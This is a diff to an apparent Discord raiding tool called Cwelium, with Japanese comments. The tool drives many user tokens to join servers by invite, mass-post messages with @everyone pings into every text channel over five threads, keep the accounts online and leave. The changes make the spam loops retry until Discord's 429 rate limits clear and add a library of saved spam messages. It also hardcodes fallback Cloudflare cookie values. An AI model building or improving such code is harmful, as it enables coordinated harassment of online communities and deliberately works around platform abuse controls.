@@ -132,7 +132,7 @@ class Files:
 
     @staticmethod
     def write_folders():
-        folders = ["data", "scraped"]
+        folders = ["data", "scraped", "data/messages"]
         for folder in folders:
             try:
                 if not os.path.exists(folder):
@@ -221,7 +221,7 @@ class Render:
         self.clear()
         self.title(f"Cwelium | Connected as {self.username} | made by Tips-Discord")
         
-        # ★ ロゴを "Masumani" に変更 ★
+        # ★ ロゴ "Masumani" ★
         edges = {"╗", "║", "╚", "╝", "═", "╔"}
         logo = [
             " ███╗   ███╗ █████╗ ███████╗██╗   ██╗███╗   ███╗ █████╗ ███╗   ██╗██╗",
@@ -605,14 +605,13 @@ class Raider:
             response = requests.get(
                 'https://discord.com/api/v9/experiments',
             )
-            match response.status_code:
-                case 200:
-                    return "; ".join(
-                        [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
-                    ) + f"; locale=en-US", response.json()["fingerprint"]
-                case _:
-                    console.log("ERROR", C["red"], "Failed to get cookies using Static")
-                    return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
+            if response.status_code == 200:
+                return "; ".join(
+                    [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
+                ) + f"; locale=en-US", response.json()["fingerprint"]
+            else:
+                console.log("ERROR", C["red"], "Failed to get cookies using Static")
+                return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
         except Exception as e:
             console.log("ERROR", C["red"], "get_discord_cookies", e)
 
@@ -679,15 +678,14 @@ class Raider:
                     params=params
                 )
 
-                match response.status_code:
-                    case 200:
-                        invite_info = response.json()
-                        break
-                    case 404:
-                        console.log("Failed", C["red"], "Invalid or expired invite")
-                        input()
-                        Menu().main_menu()
-                        return
+                if response.status_code == 200:
+                    invite_info = response.json()
+                    break
+                elif response.status_code == 404:
+                    console.log("Failed", C["red"], "Invalid or expired invite")
+                    input()
+                    Menu().main_menu()
+                    return
             
             if not invite_info:
                 console.log("Failed", C["red"], "Could not retrieve invite info")
@@ -723,15 +721,14 @@ class Raider:
                         json=payload
                     )
 
-                    match resp.status_code:
-                        case 200:
-                            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
-                        case 400:
-                            console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
-                        case 429:
-                            console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
-                        case _:
-                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json()["message"])
+                    if resp.status_code == 200:
+                        console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
+                    elif resp.status_code == 400:
+                        console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
+                    elif resp.status_code == 429:
+                        console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
+                    else:
+                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json()["message"])
                 except Exception as e:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -752,12 +749,11 @@ class Raider:
                     headers=self.headers(token)
                 )
 
-                match response.status_code:
-                    case 200:
-                        try:
-                            return response.json()["name"]
-                        except:
-                            return guild
+                if response.status_code == 200:
+                    try:
+                        return response.json()["name"]
+                    except:
+                        return guild
                 
             self.guild = get_guild_name(guild)
 
@@ -771,16 +767,16 @@ class Raider:
                 headers=self.headers(token)
             )
 
-            match response.status_code:
-                case 204:
-                    console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
-                case 429:
-                    console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                case _:
-                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
+            if response.status_code == 204:
+                console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
+            elif response.status_code == 429:
+                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+            else:
+                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
+    # ================== 改良版 スパマー（ファイル保存＆429リトライ対応） ==================
     def spammer(self, token, channel, message=None, guild=None, massping=None, pings=None, random_str=None, delay=None):
         try:
             if massping and guild:
@@ -808,22 +804,22 @@ class Raider:
                     json=payload
                 )
 
-                match response.status_code:
-                    case 200:
-                        console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                        if delay:
-                            time.sleep(delay)
-                    case 429:
-                        retry_after = response.json()["retry_after"]
-                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
-                        time.sleep(float(retry_after))
-                    case _:
-                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
-                        return
+                if response.status_code == 200:
+                    console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                    if delay:
+                        time.sleep(delay)
+                elif response.status_code == 429:
+                    retry_after = response.json()["retry_after"]
+                    console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"retry_after {retry_after:.2f}s")
+                    time.sleep(retry_after)
+                    # リトライ（ループ継続）
+                else:
+                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
+                    return
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
-    # ★ 新機能：サーバー全チャンネルにスパム（3から呼び出し）
+    # ================== 改良版 マルチチャンネルスパマー（429リトライ＆高速化） ==================
     def guild_spammer(self, token, guild_id, message, pings, delay):
         try:
             resp = session.get(
@@ -831,7 +827,7 @@ class Raider:
                 headers=self.headers(token)
             )
             if resp.status_code != 200:
-                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "チャンネル取得失敗")
+                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"チャンネル取得失敗 ({resp.status_code})")
                 return
 
             channels = resp.json()
@@ -843,19 +839,29 @@ class Raider:
             def send_to_channel(channel):
                 c_id = channel['id']
                 content = ("@everyone " * pings) + message if pings > 0 else message
-                try:
-                    r = session.post(
-                        f"https://discord.com/api/v9/channels/{c_id}/messages",
-                        headers=self.headers(token),
-                        json={"content": content}
-                    )
-                    if r.status_code == 200:
-                        console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ch {c_id}")
-                    else:
-                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ch {c_id} ({r.status_code})")
-                except Exception as e:
-                    console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
+                while True:  # 429が解消されるまでリトライ
+                    try:
+                        r = session.post(
+                            f"https://discord.com/api/v9/channels/{c_id}/messages",
+                            headers=self.headers(token),
+                            json={"content": content}
+                        )
+                        if r.status_code == 200:
+                            console.log("Sent", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ch {c_id}")
+                            break  # 成功したらループ抜ける
+                        elif r.status_code == 429:
+                            retry_after = r.json().get("retry_after", 5)
+                            console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ch {c_id} wait {retry_after:.2f}s")
+                            time.sleep(retry_after)
+                            # リトライ（ループ継続）
+                        else:
+                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ch {c_id} ({r.status_code})")
+                            break  # 429以外のエラーは諦める
+                    except Exception as e:
+                        console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ch {c_id}: {e}")
+                        break
 
+            # 最大5スレッドで並列送信（各スレッドで429リトライ対応）
             with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                 executor.map(send_to_channel, text_channels)
 
@@ -864,7 +870,7 @@ class Raider:
         except Exception as e:
             console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
-    # ★ ステータス消去（06）
+    # ================== ステータス消去（06） ==================
     def clear_activity(self):
         for token in tokens:
             try:
@@ -894,18 +900,21 @@ class Raider:
                 console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
             time.sleep(0.5)
 
-    # ★ オンライン維持（13 の修正版）
+    # ================== オンライン維持（13 修正） ==================
     def keep_online(self, token):
         while True:
             try:
-                session.patch(
+                resp = session.patch(
                     "https://discord.com/api/v9/users/@me/settings",
                     headers=self.headers(token),
                     json={"status": "online"}
                 )
-                console.log("Online", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-            except:
-                pass
+                if resp.status_code == 200:
+                    console.log("Online", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                else:
+                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"status {resp.status_code}")
+            except Exception as e:
+                console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
             time.sleep(60)
 
     # ---------- 以下、既存のメソッド（変更なし） ----------
@@ -1619,44 +1628,90 @@ class Menu:
         input(f"\n   {self.background}~/> press enter to continue ")
         self.main_menu()
 
-    # ========== 03 Spammer（拡張版 + 即時チャンネル表示） ==========
+    # ================== メッセージファイル操作ヘルパー ==================
+    def get_message_from_file_or_input(self):
+        """保存済みメッセージファイルを選択するか、新規入力を促す"""
+        msg_dir = "data/messages"
+        if not os.path.exists(msg_dir):
+            os.makedirs(msg_dir)
+
+        files = [f for f in os.listdir(msg_dir) if f.endswith('.txt')]
+        if files:
+            print(f"{C['cyan']}保存済みメッセージ:{C['white']}")
+            for idx, fname in enumerate(files, 1):
+                print(f"  {idx}: {fname}")
+            print("  0: 新規入力")
+            choice = input(console.prompt("選択 (番号)"))
+            if choice.isdigit() and int(choice) > 0 and int(choice) <= len(files):
+                selected = files[int(choice)-1]
+                with open(os.path.join(msg_dir, selected), 'r', encoding='utf-8') as f:
+                    msg = f.read().strip()
+                console.log("Loaded", C["green"], False, f"メッセージ '{selected}' を読み込みました")
+                return msg
+            else:
+                console.log("Info", C["yellow"], False, "新規メッセージを入力します")
+        else:
+            console.log("Info", C["yellow"], False, "保存済みメッセージはありません。新規入力します。")
+
+        msg = input(console.prompt("メッセージ (空でキャンセル)"))
+        if msg == "":
+            return None
+
+        save = input(console.prompt("このメッセージを保存しますか？ (y/n)"))
+        if save.lower().startswith('y'):
+            fname = input(console.prompt("ファイル名 (例: spam1.txt)"))
+            if not fname.endswith('.txt'):
+                fname += '.txt'
+            with open(os.path.join(msg_dir, fname), 'w', encoding='utf-8') as f:
+                f.write(msg)
+            console.log("Saved", C["green"], False, f"'{fname}' に保存しました")
+        return msg
+
+    # ================== 03 Spammer（大幅アップデート） ==================
     @wrapper
     def spammer(self):
         console.title("Cwelium - Spammer")
+        
+        # メッセージ取得（ファイル選択または新規入力）
+        message = self.get_message_from_file_or_input()
+        if message is None:
+            self.main_menu()
+
         use_guild = input(console.prompt("Use Guild ID for all channels? (y/n)"))
         if use_guild.lower().startswith('y'):
             guild_id = input(console.prompt("Guild ID"))
             if not guild_id:
                 self.main_menu()
             
-            # ★ サーバーID入力後、即座にチャンネル一覧を取得して表示 ★
+            # チャンネル一覧を全トークンで試行
             console.log("Fetching channel list...", C["yellow"])
-            try:
-                temp_token = tokens[0]
-                headers = self.raider.headers(temp_token)
-                resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
-                if resp.status_code == 200:
-                    channels = resp.json()
-                    text_channels = [c for c in channels if c.get('type') == 0]
-                    console.log("Found", C["green"], False, f"{len(text_channels)} text channels")
-                    for ch in text_channels[:15]:
-                        console.log("Channel", C["cyan"], False, f"{ch['id']} - #{ch.get('name', 'No name')}")
-                    if len(text_channels) > 15:
-                        console.log("Info", C["gray"], False, f"... and {len(text_channels)-15} more")
-                    if not text_channels:
-                        console.log("Warning", C["yellow"], False, "No text channels found in this guild.")
-                else:
-                    console.log("Failed", C["red"], False, f"Could not fetch channels (HTTP {resp.status_code})")
-                    input("Press Enter to continue...")
-                    self.main_menu()
-            except Exception as e:
-                console.log("Error", C["red"], False, f"Failed to fetch: {e}")
+            found = False
+            for token in tokens:
+                try:
+                    headers = self.raider.headers(token)
+                    resp = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
+                    if resp.status_code == 200:
+                        channels = resp.json()
+                        text_channels = [c for c in channels if c.get('type') == 0]
+                        console.log("Found", C["green"], False, f"{len(text_channels)} text channels")
+                        for ch in text_channels[:15]:
+                            console.log("Channel", C["cyan"], False, f"{ch['id']} - #{ch.get('name', 'No name')}")
+                        if len(text_channels) > 15:
+                            console.log("Info", C["gray"], False, f"... and {len(text_channels)-15} more")
+                        if not text_channels:
+                            console.log("Warning", C["yellow"], False, "No text channels found in this guild.")
+                        found = True
+                        break
+                    else:
+                        console.log("Failed", C["red"], False, f"Token {token[:15]}... failed ({resp.status_code})")
+                except Exception as e:
+                    console.log("Error", C["red"], False, f"Token {token[:15]}... error: {e}")
+            
+            if not found:
+                console.log("Failed", C["red"], "All tokens failed to fetch channels.")
                 input("Press Enter to continue...")
                 self.main_menu()
 
-            message = input(console.prompt("Message"))
-            if not message:
-                self.main_menu()
             pings = int(input(console.prompt("Pings amount (0推奨)")) or "0")
             delay = float(input(console.prompt("Delay between cycles (秒, 3〜5推奨)")) or "3")
             console.clear()
@@ -1671,9 +1726,6 @@ class Menu:
             channel_id = link.split("/")[5]
             massping = input(console.prompt("Massping", True))
             random_str = input(console.prompt("Random String", True))
-            message = input(console.prompt("Message"))
-            if message == "":
-                self.main_menu()
             delay_input = input(console.prompt("Delay (seconds)"))
             delay = None
             if delay_input != "":
@@ -1692,13 +1744,13 @@ class Menu:
             ]
             self.run(self.raider.spammer, args)
 
-    # ========== 06 Clear Status ==========
+    # ================== 06 Clear Status ==================
     @wrapper
     def clear_status(self):
         console.title("Cwelium - Clear Status")
         self.run(self.raider.clear_activity, [()])
 
-    # ========== 13 Onliner（修正版） ==========
+    # ================== 13 Onliner ==================
     def onliner(self):
         console.title("Cwelium - Onliner")
         args = [(token,) for token in tokens]
